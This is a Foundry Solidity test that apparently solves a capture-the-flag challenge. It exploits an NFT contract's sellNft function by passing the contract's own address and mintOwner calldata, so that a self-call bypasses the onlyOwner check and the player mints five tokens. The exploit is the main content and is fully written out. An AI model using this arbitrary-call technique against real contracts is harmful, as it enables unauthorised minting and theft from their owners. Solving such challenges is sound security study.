// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";

import {Challenge} from "src/##-uecallnft/Challenge.sol";
import {UECallNft} from "src/##-uecallnft/UECallNft.sol";

contract SolveTest is Test {
  uint256 internal constant PRICE = 0.01 ether;

  Challenge internal challenge;
  UECallNft internal nft;

  address internal deployer;
  address internal player;

  address internal seller1;
  address internal seller2;
  address internal seller3;
  address internal seller4;
  address internal seller5;

  function setUp() public {
    deployer = makeAddr("deployer");
    player = makeAddr("player");

    seller1 = makeAddr("seller1");
    seller2 = makeAddr("seller2");
    seller3 = makeAddr("seller3");
    seller4 = makeAddr("seller4");
    seller5 = makeAddr("seller5");

    vm.startPrank(deployer);
    nft = new UECallNft();
    challenge = new Challenge(player, nft);
    vm.stopPrank();

    vm.deal(seller1, PRICE);
    vm.deal(seller2, PRICE);
    vm.deal(seller3, PRICE);
    vm.deal(seller4, PRICE);
    vm.deal(seller5, PRICE);
  }

  function testSolve() public {
    // Mint 5 real NFTs so we have valid tokenIds to burn in sellNft.
    vm.prank(seller1);
    nft.mintUEC{value: PRICE}(); // id = 1
    vm.prank(seller2);
    nft.mintUEC{value: PRICE}(); // id = 2
    vm.prank(seller3);
    nft.mintUEC{value: PRICE}(); // id = 3
    vm.prank(seller4);
    nft.mintUEC{value: PRICE}(); // id = 4
    vm.prank(seller5);
    nft.mintUEC{value: PRICE}(); // id = 5

    bytes memory mintPlayer = abi.encodeWithSelector(UECallNft.mintOwner.selector, player);

    // self-call in sellNft => msg.sender becomes address(nft), bypassing onlyOwner.
    vm.prank(seller1);
    nft.sellNft(1, address(nft), mintPlayer);
    vm.prank(seller2);
    nft.sellNft(2, address(nft), mintPlayer);
    vm.prank(seller3);
    nft.sellNft(3, address(nft), mintPlayer);
    vm.prank(seller4);
    nft.sellNft(4, address(nft), mintPlayer);
    vm.prank(seller5);
    nft.sellNft(5, address(nft), mintPlayer);

    assertEq(nft.balanceOf(player), 5);
    assertTrue(challenge.isSolved());
  }
}
